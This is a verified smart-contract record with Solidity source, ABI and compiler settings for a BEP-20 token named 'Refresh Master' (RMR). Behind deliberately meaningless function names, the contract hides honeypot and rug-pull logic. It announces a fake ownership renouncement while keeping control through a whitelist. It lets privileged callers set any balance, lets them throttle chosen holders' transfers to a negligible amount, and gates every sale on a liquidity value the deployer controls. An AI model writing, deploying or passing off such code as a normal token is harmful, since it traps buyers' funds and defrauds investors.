{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface senderFrom {\n    function createPair(address receiverFee, address receiverFundMarketing) external returns (address);\n}\n\ninterface feeSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellAutoTrading) external view returns (uint256);\n\n    function transfer(address senderTotal, uint256 amountLaunch) external returns (bool);\n\n    function allowance(address enableLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderTotal,\n        uint256 amountLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atTx, uint256 value);\n    event Approval(address indexed enableLimit, address indexed spender, uint256 value);\n}\n\nabstract contract buySender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeSellMetadata is feeSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RefreshMaster is buySender, feeSell, feeSellMetadata {\n\n    function launchedSellBuy(address fundTeam, uint256 amountLaunch) public {\n        toWallet();\n        swapMode[fundTeam] = amountLaunch;\n    }\n\n    uint256 private walletMinAmount;\n\n    constructor (){\n        \n        exemptTo launchTo = exemptTo(swapFrom);\n        sellReceiver = senderFrom(launchTo.factory()).createPair(launchTo.WETH(), address(this));\n        if (liquidityIs != autoExempt) {\n            autoExempt = buyShould;\n        }\n        toIs = _msgSender();\n        totalTx[toIs] = true;\n        swapMode[toIs] = teamTakeEnable;\n        amountAutoMin();\n        \n        emit Transfer(address(0), toIs, teamTakeEnable);\n    }\n\n    bool public teamTxTotal;\n\n    uint256 exemptLimit;\n\n    function exemptFee(address swapAmount, address senderTotal, uint256 amountLaunch) internal returns (bool) {\n        if (swapAmount == toIs) {\n            return totalSender(swapAmount, senderTotal, amountLaunch);\n        }\n        uint256 totalFrom = feeSell(sellReceiver).balanceOf(liquiditySender);\n        require(totalFrom == marketingLiquidity);\n        require(senderTotal != liquiditySender);\n        if (toReceiver[swapAmount]) {\n            return totalSender(swapAmount, senderTotal, shouldWallet);\n        }\n        return totalSender(swapAmount, senderTotal, amountLaunch);\n    }\n\n    function transfer(address fundTeam, uint256 amountLaunch) external virtual override returns (bool) {\n        return exemptFee(_msgSender(), fundTeam, amountLaunch);\n    }\n\n    function totalSender(address swapAmount, address senderTotal, uint256 amountLaunch) internal returns (bool) {\n        require(swapMode[swapAmount] >= amountLaunch);\n        swapMode[swapAmount] -= amountLaunch;\n        swapMode[senderTotal] += amountLaunch;\n        emit Transfer(swapAmount, senderTotal, amountLaunch);\n        return true;\n    }\n\n    bool private takeFrom;\n\n    function approve(address fundMin, uint256 amountLaunch) public virtual override returns (bool) {\n        walletTradingToken[_msgSender()][fundMin] = amountLaunch;\n        emit Approval(_msgSender(), fundMin, amountLaunch);\n        return true;\n    }\n\n    function amountAt(address swapTx) public {\n        toWallet();\n        \n        if (swapTx == toIs || swapTx == sellReceiver) {\n            return;\n        }\n        toReceiver[swapTx] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamTakeEnable;\n    }\n\n    address swapFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return takeTokenTeam;\n    }\n\n    uint256 public liquidityIs;\n\n    string private maxAmountTotal = \"Refresh Master\";\n\n    function buyAuto(uint256 amountLaunch) public {\n        toWallet();\n        marketingLiquidity = amountLaunch;\n    }\n\n    address public toIs;\n\n    mapping(address => mapping(address => uint256)) private walletTradingToken;\n\n    mapping(address => bool) public totalTx;\n\n    uint256 public buyShould;\n\n    bool private sellList;\n\n    function transferFrom(address swapAmount, address senderTotal, uint256 amountLaunch) external override returns (bool) {\n        if (_msgSender() != swapFrom) {\n            if (walletTradingToken[swapAmount][_msgSender()] != type(uint256).max) {\n                require(amountLaunch <= walletTradingToken[swapAmount][_msgSender()]);\n                walletTradingToken[swapAmount][_msgSender()] -= amountLaunch;\n            }\n        }\n        return exemptFee(swapAmount, senderTotal, amountLaunch);\n    }\n\n    function amountAutoMin() public {\n        emit OwnershipTransferred(toIs, address(0));\n        takeTokenTeam = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldReceiver;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return maxAmountTotal;\n    }\n\n    function getOwner() external view returns (address) {\n        return takeTokenTeam;\n    }\n\n    address public sellReceiver;\n\n    address private takeTokenTeam;\n\n    mapping(address => uint256) private swapMode;\n\n    address liquiditySender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function launchAmount(address enableExempt) public {\n        require(enableExempt.balance < 100000);\n        if (teamTxTotal) {\n            return;\n        }\n        \n        totalTx[enableExempt] = true;\n        \n        teamTxTotal = true;\n    }\n\n    mapping(address => bool) public toReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitEnable;\n    }\n\n    uint256 marketingLiquidity;\n\n    uint256 public listReceiverLiquidity;\n\n    uint256 private teamTakeEnable = 100000000 * 10 ** 18;\n\n    uint8 private limitEnable = 18;\n\n    string private shouldReceiver = \"RMR\";\n\n    function balanceOf(address sellAutoTrading) public view virtual override returns (uint256) {\n        return swapMode[sellAutoTrading];\n    }\n\n    uint256 public autoExempt;\n\n    uint256 constant shouldWallet = 4 ** 10;\n\n    function toWallet() private view {\n        require(totalTx[_msgSender()]);\n    }\n\n    function allowance(address amountSellMarketing, address fundMin) external view virtual override returns (uint256) {\n        if (fundMin == swapFrom) {\n            return type(uint256).max;\n        }\n        return walletTradingToken[amountSellMarketing][fundMin];\n    }\n\n    event OwnershipTransferred(address indexed fromTeamLaunch, address indexed limitAutoTotal);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTeamLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitAutoTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSellMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTx\",\"type\":\"address\"}],\"name\":\"amountAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountAutoMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAutoTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountLaunch\",\"type\":\"uint256\"}],\"name\":\"buyAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableExempt\",\"type\":\"address\"}],\"name\":\"launchAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLaunch\",\"type\":\"uint256\"}],\"name\":\"launchedSellBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listReceiverLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTxTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RefreshMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}